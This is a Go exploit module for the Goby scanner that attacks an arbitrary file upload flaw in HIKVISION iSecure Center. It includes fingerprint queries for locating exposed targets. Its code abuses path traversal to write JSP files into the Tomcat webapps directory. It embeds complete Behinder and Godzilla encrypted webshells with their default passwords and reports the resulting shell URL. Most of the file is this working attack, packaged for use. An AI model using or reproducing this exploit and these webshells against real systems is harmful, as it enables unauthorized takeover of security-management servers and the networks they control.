package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "HIKVISION iSecure Center files file upload vulnerability",
    "Description": "<p>HiKVISION integrated security management platform iSecure Center provides open capabilities in video, all-in-one card, parking lot, face application, event service, alarm detection, temperature measurement application, etc.</p><p>HiKVISION integrated security management platform has an arbitrary file upload vulnerability. An attacker can use this vulnerability to upload arbitrary files on the server side, execute code, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "HIKVISION-iSecure-Center",
    "Homepage": "https://www.hikvision.com/",
    "DisclosureDate": "2023-08-10",
    "PostTime": "2023-08-15",
    "Author": "m0x0is3ry@foxmail.com",
    "FofaQuery": "title=\"综合安防管理平台\" || body=\"commonVar.js\" || body=\"nstallRootCert.exe\" || header=\"portal:8082\" || banner=\"portal:8082\" || cert=\"ga.hikvision.com\" || body=\"error/browser.do\" || body=\"InstallRootCert.exe\" || body=\"error/browser.do\" || body=\"2b73083e-9b29-4005-a123-1d4ec47a36d5\" || cert=\"ivms8700\" || title=\"iVMS-\" || body=\"code-iivms\" || body=\"g_szCacheTime\" || body=\"getExpireDateOfDays.action\" || body=\"//caoshiyan modify 2015-06-30 中转页面\" || body=\"/home/locationIndex.action\" || body=\"laRemPassword\" || body=\"LoginForm.EhomeUserName.value\" || (body=\"laCurrentLanguage\" && body=\"iVMS\") || header=\"Server: If you want know, you can ask me\" || banner=\"Server: If you want know, you can ask me\" || body=\"download/iVMS-\" || body=\"if (refreshurl == null || refreshurl == '') { window.location.reload();}\" || header=\"EPORTAL_JSESSIONID\" || banner=\"EPORTAL_JSESSIONID\"",
    "GobyQuery": "title=\"综合安防管理平台\" || body=\"commonVar.js\" || body=\"nstallRootCert.exe\" || header=\"portal:8082\" || banner=\"portal:8082\" || cert=\"ga.hikvision.com\" || body=\"error/browser.do\" || body=\"InstallRootCert.exe\" || body=\"error/browser.do\" || body=\"2b73083e-9b29-4005-a123-1d4ec47a36d5\" || cert=\"ivms8700\" || title=\"iVMS-\" || body=\"code-iivms\" || body=\"g_szCacheTime\" || body=\"getExpireDateOfDays.action\" || body=\"//caoshiyan modify 2015-06-30 中转页面\" || body=\"/home/locationIndex.action\" || body=\"laRemPassword\" || body=\"LoginForm.EhomeUserName.value\" || (body=\"laCurrentLanguage\" && body=\"iVMS\") || header=\"Server: If you want know, you can ask me\" || banner=\"Server: If you want know, you can ask me\" || body=\"download/iVMS-\" || body=\"if (refreshurl == null || refreshurl == '') { window.location.reload();}\" || header=\"EPORTAL_JSESSIONID\" || banner=\"EPORTAL_JSESSIONID\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to upload files, execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>Solutions are currently provided, please pay attention to the manufacturer's homepage for updates: <a href=\"https://www.hikvision.com/\">https://www.hikvision.com/</a></p><p>Temporary fix:</p><p>1. Set access policies through security devices such as firewalls and set whitelist access.</p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abc.jsp",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(\"hello\");%>",
            "show": "attackType=custom"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla",
            "show": "attackType=webshell"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2022-88855"
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "HIKVISION iSecure Center files 文件上传漏洞",
            "Product": "HIKVISION-iSecure-Center",
            "Description": "<p>HiKVISION 综合安防管理平台 iSecure Center 提供了视频、一卡通、停车场、人脸应用、事件服务、报警检测、测温应用等方面的能力开放。</p><p>HiKVISION 综合安防管理平台存在任意文件上传漏洞，攻击者可通过该漏洞在服务器端上传任意文件，执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "Recommendation": "<p>目前已经解决方案提供，请关注厂商主页更新：<a href=\"https://www.hikvision.com/\">https://www.hikvision.com/</a></p><p>临时修复方案：</p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端上传任意文件，执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "HIKVISION iSecure Center files file upload vulnerability",
            "Product": "HIKVISION-iSecure-Center",
            "Description": "<p>HiKVISION integrated security management platform iSecure Center provides open capabilities in video, all-in-one card, parking lot, face application, event service, alarm detection, temperature measurement application, etc.</p><p>HiKVISION integrated security management platform has an arbitrary file upload vulnerability. An attacker can use this vulnerability to upload arbitrary files on the server side, execute code, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>Solutions are currently provided, please pay attention to the manufacturer's homepage for updates: <a href=\"https://www.hikvision.com/\" target=\"_blank\">https://www.hikvision.com/</a></p><p>Temporary fix:</p><p>1. Set access policies through security devices such as firewalls and set whitelist access.</p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>Attackers can use this vulnerability to upload files, execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10821"
}`

	sendPayload0c24abaf := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/center/api/files;.html")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		boundary := goutils.RandomHexString(32)
		cfg.Header.Store("Content-Type", "multipart/form-data; boundary="+boundary)
		savePathMap := map[string]string{
			`/ROOT/` + filename:       `/center_cas/..;/` + filename + `;.html`,
			`/clusterMgr/` + filename: `/clusterMgr/` + filename + `;.html`,
		}
		for path := range savePathMap {
			cfg.Data = strings.ReplaceAll(`--`+boundary+`
Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps`+path+`"
Content-Type: application/octet-stream

`+content+`
--`+boundary+`--`, "\n", "\r\n")
			rsp, err := httpclient.DoHttpRequest(hostInfo, cfg)
			if err != nil {
				return nil, err
			}
			if !strings.Contains(rsp.Utf8Html, `"filename"`) && !strings.Contains(rsp.Utf8Html, `"link"`) {
				continue
			}
			cfgCheck := httpclient.NewGetRequestConfig(savePathMap[path])
			cfgCheck.VerifyTls = false
			cfg.FollowRedirect = false
			rsp, err = httpclient.DoHttpRequest(hostInfo, cfgCheck)
			if err != nil {
				return nil, err
			}
			if rsp.StatusCode != 500 && rsp.StatusCode != 200 {
				continue
			}
			if strings.HasPrefix(rsp.Utf8Html, `404`) && rsp.StatusCode == 200 {
				continue
			}
			return rsp, err
		}
		return nil, errors.New("漏洞利用失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			filename := goutils.RandomHexString(16) + ".jsp"
			rsp, err := sendPayload0c24abaf(u, filename, "<% out.println(\""+checkStr+"\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>")
			if err != nil {
				return false
			}
			return strings.Contains(rsp.Utf8Html, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			content := goutils.B2S(ss.Params["content"])
			filename := goutils.B2S(ss.Params["filename"])
			attackType := goutils.B2S(ss.Params["attackType"])
			webshell := goutils.B2S(ss.Params["webshell"])
			if attackType == "webshell" {
				filename = goutils.RandomHexString(16) + ".jsp"
				if webshell == "behinder" {
					// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}
%>`
				}
			}
			rsp, err := sendPayload0c24abaf(expResult.HostInfo, filename, content)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			// 资源存在
			if rsp.StatusCode != 200 && rsp.StatusCode != 500 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Success = true
			if attackType == "custom" {
				expResult.Output += "URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
			} else {
				expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
				if webshell == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if webshell == "godzilla" {
					expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				}
			}
			expResult.Output += "Webshell type: jsp"
			return expResult
		},
	))
}
